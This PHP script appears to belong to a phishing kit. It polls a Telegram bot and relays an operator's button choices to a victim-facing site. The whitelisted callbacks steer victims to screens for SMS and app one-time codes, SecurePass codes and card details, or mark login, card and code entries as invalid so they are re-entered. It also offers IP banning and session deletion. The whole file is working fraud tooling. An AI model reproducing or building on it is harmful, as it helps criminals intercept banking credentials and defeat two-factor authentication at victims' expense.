<?php
include '../settings.php';
require __DIR__.'/vendor/autoload.php';

use Telegram\Bot\Api;
$telegram = new Api($bot_token); 
$lastUpdateId = file_get_contents('last_update_id.txt');
$updates = $telegram->getUpdates(['offset' => $lastUpdateId + 1]);

if (empty($updates)) {
    die('none');
}

$lastUpdate = end($updates);

if (!isset($lastUpdate['callback_query'])) {
    die('none');
}

$callbackData = $lastUpdate['callback_query']['data'];

file_put_contents('last_update_id.txt', $lastUpdate['update_id']);


if (in_array($callbackData, [


    //Callback Pages :

    'otp_sms',                  // Page OTP sms pour validé achat ou autre avec auth sms
    'otp_app',                      
    'otp_securepass',          
    'page_cc', 
    'page_succes',         
        
    'ban_ip',            // 🚫Ban IP
    'delete_session',   //🗑️ Delete ça session
       
     /* Action invalide*/  
     'invalide_login',
     'invalide_cc',
     'invalide_sms',
     'invalide_securepass',    
     'invalide_app'
    
   
    
    
    
])) {
    die($callbackData);
} else {
    
    die('none');
}
?>


